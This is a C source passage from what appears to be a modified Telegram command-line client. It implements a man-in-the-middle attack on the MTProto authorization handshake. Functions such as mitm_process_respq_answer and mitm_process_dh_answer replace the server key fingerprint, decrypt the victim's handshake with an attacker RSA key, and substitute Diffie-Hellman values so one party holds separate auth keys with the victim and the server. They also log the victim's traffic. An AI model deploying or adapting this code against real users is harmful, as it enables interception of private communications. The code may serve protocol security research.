      fprintf (log_net_f, "[MITM -> VICTIM] %.02lf %d OUT %d", get_utime (CLOCK_REALTIME), size, mitm_port);
    } else {
      fprintf (log_net_f, "[MITM -> TELEGRAM] %.02lf %d OUT %d", get_utime (CLOCK_REALTIME), size, mitm_port);
    }
  }

  {

    int i;

    if(log_net_f) {
      for (i = 0; i < size; i++) {
	fprintf (log_net_f, " %02x", 0xFF & (unsigned char) buffer[i]);
      }
      fprintf (log_net_f, "\n");
      fflush (log_net_f);
    }

  }
#endif
  
  return n;

}

int encrypt_packet_buffer (void) {
  return pad_rsa_encrypt ((char *) packet_buffer, (packet_ptr - packet_buffer) * 4, (char *) encrypt_buffer, ENCRYPT_BUFFER_INTS * 4, pubKey->n, pubKey->e);
}

int encrypt_packet_buffer_aes_unauth (const char server_nonce[16], const char hidden_client_nonce[32]) {
  init_aes_unauth (server_nonce, hidden_client_nonce, AES_ENCRYPT);
  return pad_aes_encrypt ((char *) packet_buffer, (packet_ptr - packet_buffer) * 4, (char *) encrypt_buffer, ENCRYPT_BUFFER_INTS * 4);
}

static int _mitm_pad_aes_encrypt_auth (char *data, int len_in,
				       const char server_nonce[16],
				       const char hidden_client_nonce[32]) {
  init_aes_unauth (server_nonce, hidden_client_nonce, AES_ENCRYPT);  
  return pad_aes_encrypt (data, len_in, (char *) encrypt_buffer, ENCRYPT_BUFFER_INTS * 4);
}

static int _mitm_pad_aes_decrypt_auth (char *from, int from_len, 
				       char *to, int size,
				       const char server_nonce[16],
				       const char hidden_client_nonce[32]) {
  init_aes_unauth (server_nonce, hidden_client_nonce, AES_DECRYPT);
  return pad_aes_decrypt (from, from_len, to, size);
}

int rpc_send_packet (struct connection *c) {
  int len = (packet_ptr - packet_buffer) * 4;
  c->out_packet_num ++;
  long long next_msg_id = (long long) ((1LL << 32) * get_utime (CLOCK_REALTIME)) & -4;
  if (next_msg_id <= unenc_msg_header.out_msg_id) {
    unenc_msg_header.out_msg_id += 4;
  } else {
    unenc_msg_header.out_msg_id = next_msg_id;
  }
  unenc_msg_header.msg_len = len;

  int total_len = len + 20;
  assert (total_len > 0 && !(total_len & 0xfc000003));
  total_len >>= 2;
  if (total_len < 0x7f) {
    assert (write_out (c, &total_len, 1) == 1);
  } else {
    total_len = (total_len << 8) | 0x7f;
    assert (write_out (c, &total_len, 4) == 4);
  }
  write_out (c, &unenc_msg_header, 20);
  write_out (c, packet_buffer, len);
  flush_out (c);

  total_packets_sent ++;
  total_data_sent += total_len;
  return 1;
}

int rpc_send_message (struct connection *c, void *data, int len) {
  assert (len > 0 && !(len & 0xfc000003));
  int total_len = len >> 2;
  if (total_len < 0x7f) {
    assert (write_out (c, &total_len, 1) == 1);
  } else {
    total_len = (total_len << 8) | 0x7f;
    assert (write_out (c, &total_len, 4) == 4);
  }
  c->out_packet_num ++;
  assert (write_out (c, data, len) == len);
  flush_out (c);

  total_packets_sent ++;
  total_data_sent += total_len;
  return 1;
}

int send_req_pq_packet (struct connection *c) {
  assert (c_state == st_init);
  secure_random (nonce, 16);
  unenc_msg_header.out_msg_id = 0;
  clear_packet ();
  out_int (CODE_req_pq);
  out_ints ((int *)nonce, 4);
  rpc_send_packet (c);    
  c_state = st_reqpq_sent;
  return 1;
}

int mitm_send_req_pq_packet (struct connection *c) {

  char *data;
  int len;

  /* Receive data from victim */
  data = NULL; len=0;
  mitm_recv(mitm_victim_fd, &data, &len);

  memcpy(nonce, &data[24], 16);
  fprintf(stdout, "[VICTIM -> MITM -> TELEGRAM]:\n");
  _print_req_pq_message(stdout, (unsigned char *) data, 0);

  clear_packet ();
  out_data(&data[20], len-20);
  rpc_send_packet(c);

  free(data);
  c_state = st_reqpq_sent;

  return 1;

}

unsigned long long gcd (unsigned long long a, unsigned long long b) {
  return b ? gcd (b, a % b) : a;
}

//typedef unsigned int uint128_t __attribute__ ((mode(TI)));
unsigned long long what;
unsigned p1, p2;

int mitm_process_respq_answer (struct connection *c, char *packet, int len) {

  if(!c) return 0;

  /* (1) Modify Telegram's resPQ answer, just by changing the fingerprint by ours */
  /* mitm_save_buffers (); */
  char *data;
  int mitm_fingerprints_num, _len;

  data = (char *) malloc(sizeof(char)*(len+1));
  memcpy(&data[1], packet, len);
  memcpy (server_nonce, packet + 40, 16);

  fprintf(stdout, "\n[TELEGRAM -> MITM]:\n");
  _print_respq_message(stdout, (unsigned char *) data, 1);

  /* Change fingerprint*/
  mitm_fingerprints_num = 1;
  memcpy(&data[73], &mitm_fingerprints_num, 4);
  memcpy(&data[77], &mitm_pk_fingerprint, 8);

  /* (2) Send it to the victim */
  data[0] = 0x15; // Size hardcoded...
  mitm_send(mitm_victim_fd, data, 85);

  fprintf(stdout, "\n[MITM -> VICTIM] (%.2lf):\n", get_utime(CLOCK_REALTIME));
  _print_respq_message(stdout, (unsigned char *) data, 1);

  /* Wait for the victim's req_DH_params message */
  free(data); data = NULL;
  mitm_recv(mitm_victim_fd, &data, &_len);

  /* Decode the victim's pq_inner_data using our RSA private key */
  char *dec_data = malloc(sizeof(char)*DECRYPT_BUFFER_INTS * 4);
  pad_rsa_decrypt (data + 84, (_len - 84),
		   dec_data, DECRYPT_BUFFER_INTS * 4,
		   mitm_pubKey->n, mitm_prvKey->d);

  fprintf(stdout, "[VICTIM -> MITM] (%.2lf):\n", get_utime(CLOCK_REALTIME));
  _print_req_dh_message(stdout, (unsigned char *) data, 0);
  _print_req_dh_dec_data(stdout, (unsigned char *) dec_data, 0);

  /* Set new_nonce */
  memcpy (new_nonce, dec_data + 84, 32);

  /* (3) Re-encode it using Telegram's server RSA public key */
  memset(encrypt_buffer, 0, ENCRYPT_BUFFER_INTS * 4);
  int l_out = pad_rsa_encrypt ((char *) dec_data, 116, (char *) encrypt_buffer, ENCRYPT_BUFFER_INTS * 4, pubKey->n, pubKey->e);

  clear_packet ();
  memcpy(&data[72], &pk_fingerprint, 8);
  data[80] = 0xfe; data[81] = 0x00; data[82] = 0x01; data[83] = 0x00;
  memcpy(&data[84], encrypt_buffer, l_out);
  out_data(&data[20], _len-20);

  fprintf(stdout, "\n[MITM -> TELEGRAM] (%.2lf):\n", get_utime(CLOCK_REALTIME));
  _print_req_dh_message(stdout, (unsigned char *) data, 0);
  _print_req_dh_dec_data(stdout, (unsigned char *) dec_data, 0);

  /* /\* Set p1 *\/ */
  /* memcpy (server_nonce, packet + 40, 16); */
  /* /\* Set p2 *\/ */
  /* memcpy (server_nonce, packet + 40, 16); */

  free(data); free(dec_data);
  c_state = st_reqdh_sent;
  
  return rpc_send_packet (c);

}

int process_respq_answer (struct connection *c, char *packet, int len) {
  int i;
  if (verbosity) {
    logprintf ( "process_respq_answer(), len=%d\n", len);
  }
  assert (len >= 76);
  assert (!*(long long *) packet);
  assert (*(int *) (packet + 16) == len - 20);
  assert (!(len & 3));
  assert (*(int *) (packet + 20) == CODE_resPQ);
  assert (!memcmp (packet + 24, nonce, 16));
  memcpy (server_nonce, packet + 40, 16);
  char *from = packet + 56;
  int clen = *from++;
  assert (clen <= 8);
  what = 0;
  for (i = 0; i < clen; i++) {
    what = (what << 8) + (unsigned char)*from++;
  }

  while (((unsigned long)from) & 3) ++from;

  p1 = 0, p2 = 0;

  if (verbosity >= 2) {
    logprintf ( "%lld received\n", what);
  }

  int it = 0;
  unsigned long long g = 0;
  for (i = 0; i < 3 || it < 1000; i++) {
    int q = ((lrand48() & 15) + 17) % what;
    unsigned long long x = (long long)lrand48 () % (what - 1) + 1, y = x;
    int lim = 1 << (i + 18);
    int j;
    for (j = 1; j < lim; j++) {
      ++it;
      unsigned long long a = x, b = x, c = q;
      while (b) {
        if (b & 1) {
          c += a;
          if (c >= what) {
            c -= what;
          }
        }
        a += a;
        if (a >= what) {
          a -= what;
        }
        b >>= 1;
      }
      x = c;
      unsigned long long z = x < y ? what + x - y : x - y;
      g = gcd (z, what);
      if (g != 1) {
        break;
      }
      if (!(j & (j - 1))) {
        y = x;
      }
    }
    if (g > 1 && g < what) break;
  }

  assert (g > 1 && g < what);
  p1 = g;
  p2 = what / g;
  if (p1 > p2) {
    unsigned t = p1; p1 = p2; p2 = t;
  }
  

  if (verbosity) {
    logprintf ( "p1 = %d, p2 = %d, %d iterations\n", p1, p2, it);
  }

  /// ++p1; ///

  assert (*(int *) (from) == CODE_vector);
  int fingerprints_num = *(int *)(from + 4);
  assert (fingerprints_num >= 1 && fingerprints_num <= 64 && len == fingerprints_num * 8 + 8 + (from - packet));
  long long *fingerprints = (long long *) (from + 8);
  for (i = 0; i < fingerprints_num; i++) {
    if (fingerprints[i] == pk_fingerprint) {
      //logprintf ( "found our public key at position %d\n", i);
      break;
    }
  }
  if (i == fingerprints_num) {
    logprintf ( "fatal: don't have any matching keys (%016llx expected)\n", pk_fingerprint);
    exit (2);
  }
  // create inner part (P_Q_inner_data)
  clear_packet ();
  packet_ptr += 5;
  out_int (CODE_p_q_inner_data);
  out_cstring (packet + 57, clen);
  //out_int (0x0f01);  // pq=15

  if (p1 < 256) {
    clen = 1;
  } else if (p1 < 65536) {
    clen = 2;
  } else if (p1 < 16777216) {
    clen = 3;
  } else {
    clen = 4;
  } 
  p1 = __builtin_bswap32 (p1);
  out_cstring ((char *)&p1 + 4 - clen, clen);
  p1 = __builtin_bswap32 (p1);

  if (p2 < 256) {
    clen = 1;
  } else if (p2 < 65536) {
    clen = 2;
  } else if (p2 < 16777216) {
    clen = 3;
  } else {
    clen = 4;
  }
  p2 = __builtin_bswap32 (p2);
  out_cstring ((char *)&p2 + 4 - clen, clen);
  p2 = __builtin_bswap32 (p2);
    
  //out_int (0x0301);  // p=3
  //out_int (0x0501);  // q=5
  out_ints ((int *) nonce, 4);
  out_ints ((int *) server_nonce, 4);
  secure_random (new_nonce, 32);
  out_ints ((int *) new_nonce, 8);
  sha1 ((unsigned char *) (packet_buffer + 5), (packet_ptr - packet_buffer - 5) * 4, (unsigned char *) packet_buffer);

  int l = encrypt_packet_buffer ();
  
  clear_packet ();
  out_int (CODE_req_DH_params);
  out_ints ((int *) nonce, 4);
  out_ints ((int *) server_nonce, 4);
  //out_int (0x0301);  // p=3
  //out_int (0x0501);  // q=5
  if (p1 < 256) {
    clen = 1;
  } else if (p1 < 65536) {
    clen = 2;
  } else if (p1 < 16777216) {
    clen = 3;
  } else {
    clen = 4;
  } 
  p1 = __builtin_bswap32 (p1);
  out_cstring ((char *)&p1 + 4 - clen, clen);
  p1 = __builtin_bswap32 (p1);
  if (p2 < 256) {
    clen = 1;
  } else if (p2 < 65536) {
    clen = 2;
  } else if (p2 < 16777216) {
    clen = 3;
  } else {
    clen = 4;
  }
  p2 = __builtin_bswap32 (p2);
  out_cstring ((char *)&p2 + 4 - clen, clen);
  p2 = __builtin_bswap32 (p2);
    
  out_long (pk_fingerprint);
  out_cstring ((char *) encrypt_buffer, l);

  c_state = st_reqdh_sent;
  
  return rpc_send_packet (c);
}

int check_prime (BIGNUM *p) {
  int r = BN_is_prime (p, BN_prime_checks, 0, BN_ctx, 0);
  ensure (r >= 0);
  return r;
}

int check_DH_params (BIGNUM *p, int g) {
  if (g < 2 || g > 7) { return -1; }
  BIGNUM t;
  BN_init (&t);

  BN_init (&dh_g);
  ensure (BN_set_word (&dh_g, 4 * g));

  ensure (BN_mod (&t, p, &dh_g, BN_ctx));
  int x = BN_get_word (&t);
  assert (x >= 0 && x < 4 * g);

  BN_free (&dh_g);

  switch (g) {
  case 2:
    if (x != 7) { return -1; }
    break;
  case 3:
    if (x % 3 != 2 ) { return -1; }
    break;
  case 4:
    break;
  case 5:
    if (x % 5 != 1 && x % 5 != 4) { return -1; }
    break;
  case 6:
    if (x != 19 && x != 23) { return -1; }
    break;
  case 7:
    if (x % 7 != 3 && x % 7 != 5 && x % 7 != 6) { return -1; }
    break;
  }

  if (!check_prime (p)) { return -1; }

  BIGNUM b;
  BN_init (&b);
  ensure (BN_set_word (&b, 2));
  ensure (BN_div (&t, 0, p, &b, BN_ctx));
  if (!check_prime (&t)) { return -1; }
  BN_free (&b);
  BN_free (&t);
  return 0;
}

int check_g (unsigned char p[256], BIGNUM *g) {
  static unsigned char s[256];
  memset (s, 0, 256);
  assert (BN_num_bytes (g) <= 256);
  BN_bn2bin (g, s);
  int ok = 0;
  int i;
  for (i = 0; i < 64; i++) {
    if (s[i]) { 
      ok = 1;
      break;
    }
  }
  if (!ok) { return -1; }
  ok = 0;
  for (i = 0; i < 64; i++) {
    if (s[255 - i]) { 
      ok = 1;
      break;
    }
  }
  if (!ok) { return -1; }
  ok = 0;
  for (i = 0; i < 64; i++) {
    if (s[i] < p[i]) { 
      ok = 1;
      break;
    } else if (s[i] > p[i]) {
      logprintf ("i = %d (%d %d)\n", i, (int)s[i], (int)p[i]);
      return -1;
    }
  }
  if (!ok) { return -1; }
  return 0;
}

int check_g_bn (BIGNUM *p, BIGNUM *g) {
  static unsigned char s[256];
  memset (s, 0, 256);
  assert (BN_num_bytes (p) <= 256);
  BN_bn2bin (p, s);
  return check_g (s, g);
}

int mitm_process_dh_answer (struct connection *c, char *packet, int len) {

  /* Decrypt the response with AES key derived from (nonce,server_nonce) */
  assert (len >= 116);
  assert (!*(long long *) packet);
  assert (*(int *) (packet + 16) == len - 20);
  assert (!(len & 3));
  assert (*(int *) (packet + 20) == (int)CODE_server_DH_params_ok);
  assert (!memcmp (packet + 24, nonce, 16));
  assert (!memcmp (packet + 40, server_nonce, 16));
  init_aes_unauth (server_nonce, new_nonce, AES_DECRYPT);
  in_ptr = (int *)(packet + 56);
  in_end = (int *)(packet + len);
  int l = prefetch_strlen ();
  assert (l > 0);
  int l_decrypt = pad_aes_decrypt (fetch_str (l), l, (char *) decrypt_buffer, DECRYPT_BUFFER_INTS * 4 - 16);

  fprintf(stdout, "\n[TELEGRAM -> MITM] (%.2lf):\n", get_utime(CLOCK_REALTIME));
  _print_server_dh_params_ok_message(stdout, (unsigned char *) packet, 0);
  _print_server_dh_params_ok_dec_data(stdout, (unsigned char *) decrypt_buffer, 0);

  assert (in_ptr == in_end);
  assert (l >= 60);
  assert (decrypt_buffer[5] == (int)CODE_server_DH_inner_data);
  assert (!memcmp (decrypt_buffer + 6, nonce, 16));
  assert (!memcmp (decrypt_buffer + 10, server_nonce, 16));
  int g = decrypt_buffer[14];
  in_ptr = decrypt_buffer + 15;
  in_end = decrypt_buffer + (l >> 2);
  BN_init (&dh_prime);
  BN_init (&g_a);
  assert (fetch_bignum (&dh_prime) > 0);
  assert (fetch_bignum (&g_a) > 0);
  assert (check_g_bn (&dh_prime, &g_a) >= 0);
  assert (in_ptr <= in_end);

  /* Generate our own 'a' and 'g^a' */
  secure_random (s_mitm_a, 256);
  BIGNUM *mitm_a = BN_bin2bn ((unsigned char *) s_mitm_a, 256, 0);

  BN_init (&dh_g);
  ensure (BN_set_word (&dh_g, g));

  BIGNUM *mitm_g_a = BN_new ();
  ensure (BN_mod_exp (mitm_g_a, &dh_g, mitm_a, &dh_prime, BN_ctx));

  /* Modify the data received by Telegram server */
  l = BN_num_bytes (mitm_g_a);
  unsigned char *s_mitm_g_a = (unsigned char *) malloc(sizeof(unsigned char) * l);
  assert (BN_bn2bin (mitm_g_a, (unsigned char *) s_mitm_g_a));
  memcpy(decrypt_buffer + 81, s_mitm_g_a, l);
  free(s_mitm_g_a);

  /* Re-encode it with victim's AES key */
  unsigned char hash[20];
  sha1 ((unsigned char *) (decrypt_buffer + 5), 564, hash);
  memcpy((unsigned char *) decrypt_buffer, hash, 20);

  fprintf(stdout, "\n[MITM -> VICTIM] (%.2lf):\n", get_utime(CLOCK_REALTIME));
  _print_server_dh_params_ok_message(stdout, (unsigned char *) packet, 0);
  _print_server_dh_params_ok_dec_data(stdout, (unsigned char *) decrypt_buffer, 0);

  l = _mitm_pad_aes_encrypt_auth ((char *) decrypt_buffer, l_decrypt, server_nonce, new_nonce);

  /* Send it to victim */
  packet[56] = 0xfe; packet[57] = 0x50;
  packet[58] = 0x02; packet[59] = 0x00;
  memcpy(&packet[60], encrypt_buffer, 596);

  char data[656];
  data[0] = 0x7f; data[1] = 0xa3; 
  data[2] = 0x00; data[3] = 0x00; // Size hardcoded...
  memcpy(data + 4, packet, 652);
  mitm_send(mitm_victim_fd, data, 656);

  /* Wait for set_client_DH_params message */
  char *data_in = NULL; int _len;
  mitm_recv(mitm_victim_fd, &data_in, &_len);

  /* Decode it with AES key */
  l = _mitm_pad_aes_decrypt_auth (&data_in[60], _len - 60, 
				  (char *) decrypt_buffer, DECRYPT_BUFFER_INTS * 4 - 16,
				  server_nonce, new_nonce);

  fprintf(stdout, "[VICTIM -> MITM] (%.2lf):\n", get_utime(CLOCK_REALTIME));
  _print_set_client_DH_params_message(stdout, (unsigned char *) data_in, 0);
  _print_set_client_DH_params_dec_data(stdout, (unsigned char *) decrypt_buffer, 0);

  /* VICTIM's g^b begins at decrypt_buffer[17] */
  BIGNUM *g_b = BN_bin2bn ((unsigned char*) &decrypt_buffer[17], 256, 0);

  /* Set auth_key for Client-MITM comm as g^{b*a'} */
  BN_init (&mitm_auth_key_num);
  ensure (BN_mod_exp (&mitm_auth_key_num, g_b, mitm_a, &dh_prime, BN_ctx));
  l = BN_num_bytes (&mitm_auth_key_num);
  assert (l >= 250 && l <= 256);
  assert (BN_bn2bin (&mitm_auth_key_num, (unsigned char *) mitm_auth_key));
  memset (mitm_auth_key + l, 0, 256 - l);
  _mitm_set_auth_key_id ((unsigned char *) mitm_auth_key);
  fprintf(stdout, "[AUTH KEY(VICTIM <-> MITM)] (%.2lf): ", get_utime(CLOCK_REALTIME));
  _print_auth_key_id(stdout, mitm_auth_key_id);

  /* Now, act as client for the real Telegram server, just as a normal client */

  /* Build MITM set_client_DH_params answer */
  clear_packet ();
  packet_ptr += 5;
  out_int (CODE_client_DH_inner_data);
  out_ints ((int *) nonce, 4);
  out_ints ((int *) server_nonce, 4);
  out_long (0LL);
  
  BN_init (&dh_g);
  ensure (BN_set_word (&dh_g, g));

  /* Generate random b' and set auth_key for MITM-Telegram comm as
     g^{a*b'} */
  secure_random (s_power, 256);
  BIGNUM *dh_power = BN_bin2bn ((unsigned char *)s_power, 256, 0);
  ensure_ptr (dh_power);

  /* Send g^b' to Telegram */
  BIGNUM *y = BN_new ();
  ensure_ptr (y);
  ensure (BN_mod_exp (y, &dh_g, dh_power, &dh_prime, BN_ctx));
  out_bignum (y);
  BN_free (y);

  BN_init (&auth_key_num);
  ensure (BN_mod_exp (&auth_key_num, &g_a, dh_power, &dh_prime, BN_ctx));
  l = BN_num_bytes (&auth_key_num);
  assert (l >= 250 && l <= 256);
  assert (BN_bn2bin (&auth_key_num, (unsigned char *)GET_DC(c)->auth_key));
  memset (GET_DC(c)->auth_key + l, 0, 256 - l);
  BN_free (dh_power);
  BN_free (&auth_key_num);
  BN_free (&dh_g);
  BN_free (&g_a);
  BN_free (&dh_prime);

  {
    static unsigned char sha1_buffer[20];
    SHA1 ((unsigned char *) GET_DC(c)->auth_key, 256, sha1_buffer);
    fprintf(stdout, "[AUTH KEY(MITM <-> TELEGRAM)]: ");
    _print_auth_key_id(stdout, *(long long *)(sha1_buffer+12));
  }

  //hexdump (auth_key, auth_key + 256);
 
  sha1 ((unsigned char *) (packet_buffer + 5), (packet_ptr - packet_buffer - 5) * 4, (unsigned char *) packet_buffer);

  //hexdump ((char *)packet_buffer, (char *)packet_ptr);

  fprintf(stdout, "\n[MITM -> TELEGRAM]: (%.2lf)\n", get_utime(CLOCK_REALTIME));
  _print_set_client_DH_params_message(stdout, (unsigned char *) packet_buffer, 0);
  _print_set_client_DH_params_dec_data(stdout, (unsigned char *) packet_buffer, 0);

  l = encrypt_packet_buffer_aes_unauth (server_nonce, new_nonce);

  clear_packet ();
  out_int (CODE_set_client_DH_params);
  out_ints ((int *) nonce, 4);
  out_ints ((int *) server_nonce, 4);
  out_cstring ((char *) encrypt_buffer, l);

  c_state = st_client_dh_sent;

  return rpc_send_packet (c);

}

int process_dh_answer (struct connection *c, char *packet, int len) {
  if (verbosity) {
    logprintf ( "process_dh_answer(), len=%d\n", len);
  }
  if (len < 116) {
    logprintf ( "%u * %u = %llu", p1, p2, what);
  }
  assert (len >= 116);
  assert (!*(long long *) packet);
  assert (*(int *) (packet + 16) == len - 20);
  assert (!(len & 3));
  assert (*(int *) (packet + 20) == (int)CODE_server_DH_params_ok);
  assert (!memcmp (packet + 24, nonce, 16));
  assert (!memcmp (packet + 40, server_nonce, 16));
  init_aes_unauth (server_nonce, new_nonce, AES_DECRYPT);
  in_ptr = (int *)(packet + 56);
  in_end = (int *)(packet + len);
  int l = prefetch_strlen ();
  assert (l > 0);
  l = pad_aes_decrypt (fetch_str (l), l, (char *) decrypt_buffer, DECRYPT_BUFFER_INTS * 4 - 16);
  assert (in_ptr == in_end);
  assert (l >= 60);
  assert (decrypt_buffer[5] == (int)CODE_server_DH_inner_data);
  assert (!memcmp (decrypt_buffer + 6, nonce, 16));
  assert (!memcmp (decrypt_buffer + 10, server_nonce, 16));
  int g = decrypt_buffer[14];
  in_ptr = decrypt_buffer + 15;
  in_end = decrypt_buffer + (l >> 2);
  BN_init (&dh_prime);
  BN_init (&g_a);
  assert (fetch_bignum (&dh_prime) > 0);
  assert (fetch_bignum (&g_a) > 0);
  assert (check_g_bn (&dh_prime, &g_a) >= 0);
  int server_time = *in_ptr++;
  assert (in_ptr <= in_end);

  assert (check_DH_params (&dh_prime, g) >= 0);

  static char sha1_buffer[20];
  sha1 ((unsigned char *) decrypt_buffer + 20, (in_ptr - decrypt_buffer - 5) * 4, (unsigned char *) sha1_buffer);
  assert (!memcmp (decrypt_buffer, sha1_buffer, 20));
  assert ((char *) in_end - (char *) in_ptr < 16);

  GET_DC(c)->server_time_delta = server_time - time (0);
  GET_DC(c)->server_time_udelta = server_time - get_utime (CLOCK_MONOTONIC);
  //logprintf ( "server time is %d, delta = %d\n", server_time, server_time_delta);

  // Build set_client_DH_params answer
  clear_packet ();
  packet_ptr += 5;
  out_int (CODE_client_DH_inner_data);
  out_ints ((int *) nonce, 4);
  out_ints ((int *) server_nonce, 4);
  out_long (0LL);
  
  BN_init (&dh_g);
  ensure (BN_set_word (&dh_g, g));

  secure_random (s_power, 256);
  BIGNUM *dh_power = BN_bin2bn ((unsigned char *)s_power, 256, 0);
  ensure_ptr (dh_power);

  BIGNUM *y = BN_new ();
  ensure_ptr (y);
  ensure (BN_mod_exp (y, &dh_g, dh_power, &dh_prime, BN_ctx));
  out_bignum (y);
  BN_free (y);

  BN_init (&auth_key_num);
  ensure (BN_mod_exp (&auth_key_num, &g_a, dh_power, &dh_prime, BN_ctx));
  l = BN_num_bytes (&auth_key_num);
  assert (l >= 250 && l <= 256);
  assert (BN_bn2bin (&auth_key_num, (unsigned char *)GET_DC(c)->auth_key));
  memset (GET_DC(c)->auth_key + l, 0, 256 - l);
  BN_free (dh_power);
  BN_free (&auth_key_num);
  BN_free (&dh_g);
  BN_free (&g_a);
  BN_free (&dh_prime);

  //hexdump (auth_key, auth_key + 256);
 
  sha1 ((unsigned char *) (packet_buffer + 5), (packet_ptr - packet_buffer - 5) * 4, (unsigned char *) packet_buffer);

  //hexdump ((char *)packet_buffer, (char *)packet_ptr);

  l = encrypt_packet_buffer_aes_unauth (server_nonce, new_nonce);

  clear_packet ();
  out_int (CODE_set_client_DH_params);
  out_ints ((int *) nonce, 4);
  out_ints ((int *) server_nonce, 4);
  out_cstring ((char *) encrypt_buffer, l);

  c_state = st_client_dh_sent;

  return rpc_send_packet (c);
}

int mitm_process_auth_complete (struct connection *c UU, char *packet, int len) {

  /* (1) Verify connection MITM - TELEGRAM */
  if (verbosity) {
    logprintf ( "process_dh_answer(), len=%d\n", len);
  }
  assert (len == 72);
  assert (!*(long long *) packet);
  assert (*(int *) (packet + 16) == len - 20);
  assert (!(len & 3));
  assert (*(int *) (packet + 20) == CODE_dh_gen_ok);
  assert (!memcmp (packet + 24, nonce, 16));
  assert (!memcmp (packet + 40, server_nonce, 16));
  static unsigned char tmp[44], sha1_buffer[20], mitm_sha1_buffer[20];
  memcpy (tmp, new_nonce, 32);
  tmp[32] = 1;

  bl_do_set_auth_key_id (GET_DC(c)->id, (unsigned char *)GET_DC(c)->auth_key);
  sha1 ((unsigned char *)GET_DC(c)->auth_key, 256, sha1_buffer);

  memcpy (tmp + 33, sha1_buffer, 8);
  sha1 (tmp, 41, sha1_buffer);
  assert (!memcmp (packet + 56, sha1_buffer + 4, 16));
  GET_DC(c)->server_salt = *(long long *)server_nonce ^ *(long long *)new_nonce;
  
  if (verbosity >= 3) {
    logprintf ( "auth_key_id=%016llx\n", GET_DC(c)->auth_key_id);
  }

  c_state = st_authorized; mitm_capture_session_id = 1;

  if (verbosity) {
    logprintf ( "\n[MITM - TELEGRAM] Auth success\n");
  }
  auth_success ++;
  GET_DC(c)->flags |= 1;
  write_auth_file ();

  fprintf(stdout, "\n[TELEGRAM -> MITM] (%.2lf):\n", get_utime(CLOCK_REALTIME));
  _print_auth_ok_message(stdout, (unsigned char *) packet, 0);

  /* (2) Complete connection MITM - VICTIM */

  /* Get auth_key_aux_hash of mitm auth key */
  sha1 ((unsigned char *) mitm_auth_key, 256, mitm_sha1_buffer);

  /* Copy it after sha1(new_nonce||1||mitm_auth_key_aux_hash) */
  memcpy (tmp + 33, mitm_sha1_buffer, 8);
  sha1 (tmp, 41, mitm_sha1_buffer);

  unsigned char data[73];

  data[0] = 0x12;
  memcpy(&data[1], packet, 56);
  memcpy(&data[57], mitm_sha1_buffer + 4, 16);

  fprintf(stdout, "\n[MITM -> VICTIM] (%.2lf):\n", get_utime(CLOCK_REALTIME));
  _print_auth_ok_message(stdout, (unsigned char *) data + 1, 0);

  mitm_send(mitm_victim_fd, (char *) data, 73);

  return 1;  

}

int process_auth_complete (struct connection *c UU, char *packet, int len) {
  if (verbosity) {
    logprintf ( "process_dh_answer(), len=%d\n", len);
  }
  assert (len == 72);
  assert (!*(long long *) packet);
  assert (*(int *) (packet + 16) == len - 20);
  assert (!(len & 3));
  assert (*(int *) (packet + 20) == CODE_dh_gen_ok);
  assert (!memcmp (packet + 24, nonce, 16));
  assert (!memcmp (packet + 40, server_nonce, 16));
  static unsigned char tmp[44], sha1_buffer[20];
  memcpy (tmp, new_nonce, 32);
  tmp[32] = 1;
  //GET_DC(c)->auth_key_id = *(long long *)(sha1_buffer + 12);

  bl_do_set_auth_key_id (GET_DC(c)->id, (unsigned char *)GET_DC(c)->auth_key);
  sha1 ((unsigned char *)GET_DC(c)->auth_key, 256, sha1_buffer);

  memcpy (tmp + 33, sha1_buffer, 8);
  sha1 (tmp, 41, sha1_buffer);
  assert (!memcmp (packet + 56, sha1_buffer + 4, 16));
  GET_DC(c)->server_salt = *(long long *)server_nonce ^ *(long long *)new_nonce;
  
  if (verbosity >= 3) {
    logprintf ( "auth_key_id=%016llx\n", GET_DC(c)->auth_key_id);
  }
  //kprintf ("OK\n");

  //c->status = conn_error;
  //sleep (1);

  c_state = st_authorized;
  //return 1;
  if (verbosity) {
    logprintf ( "Auth success\n");
  }
  auth_success ++;
  GET_DC(c)->flags |= 1;
  write_auth_file ();
  
  return 1;
}

/*
 *
 *                AUTHORIZED (MAIN) PROTOCOL PART
 *
 */

struct encrypted_message enc_msg;

long long client_last_msg_id, server_last_msg_id;

double get_server_time (struct dc *DC) {
  if (!DC->server_time_udelta) {
    DC->server_time_udelta = get_utime (CLOCK_REALTIME) - get_utime (CLOCK_MONOTONIC);
  }
  return get_utime (CLOCK_MONOTONIC) + DC->server_time_udelta;
}

long long generate_next_msg_id (struct dc *DC) {
  long long next_id = (long long) (get_server_time (DC) * (1LL << 32)) & -4;
  if (next_id <= client_last_msg_id) {
    next_id = client_last_msg_id += 4;
  } else {
    client_last_msg_id = next_id;
  }
  return next_id;
}

void init_enc_msg (struct session *S, int useful) {
  struct dc *DC = S->dc;
  assert (DC->auth_key_id);
  enc_msg.auth_key_id = DC->auth_key_id;
//  assert (DC->server_salt);
  enc_msg.server_salt = DC->server_salt;
  if(c_state == st_authorized && 
     mitm_capture_session_id == 2) {
    assert(mitm_session_id != -1);
  }
  enc_msg.session_id = S->session_id;
  //enc_msg.auth_key_id2 = auth_key_id;
  enc_msg.msg_id = generate_next_msg_id (DC);
  //enc_msg.msg_id -= 0x10000000LL * (lrand48 () & 15);
  //kprintf ("message id %016llx\n", enc_msg.msg_id);
  enc_msg.seq_no = S->seq_no;
  if (useful) {
    enc_msg.seq_no |= 1;
  }
  S->seq_no += 2;
};

int aes_encrypt_message (struct dc *DC, struct encrypted_message *enc) {
  unsigned char sha1_buffer[20];
  const int MINSZ = offsetof (struct encrypted_message, message);
  const int UNENCSZ = offsetof (struct encrypted_message, server_salt);
  int enc_len = (MINSZ - UNENCSZ) + enc->msg_len;
  assert (enc->msg_len >= 0 && enc->msg_len <= MAX_MESSAGE_INTS * 4 - 16 && !(enc->msg_len & 3));
  sha1 ((unsigned char *) &enc->server_salt, enc_len, sha1_buffer);
  //printf ("enc_len is %d\n", enc_len);
  if (verbosity >= 2) {
    logprintf ( "sending message with sha1 %08x\n", *(int *)sha1_buffer);
  }
  memcpy (enc->msg_key, sha1_buffer + 4, 16);
  init_aes_auth (DC->auth_key, enc->msg_key, AES_ENCRYPT);
  //hexdump ((char *)enc, (char *)enc + enc_len + 24);
  return pad_aes_encrypt ((char *) &enc->server_salt, enc_len, (char *) &enc->server_salt, MAX_MESSAGE_INTS * 4 + (MINSZ - UNENCSZ));
}

long long encrypt_send_message (struct connection *c, int *msg, int msg_ints, int useful) {
  struct dc *DC = GET_DC(c);
  struct session *S = c->session;
  assert (S);
  const int UNENCSZ = offsetof (struct encrypted_message, server_salt);
  if (msg_ints <= 0 || msg_ints > MAX_MESSAGE_INTS - 4) {
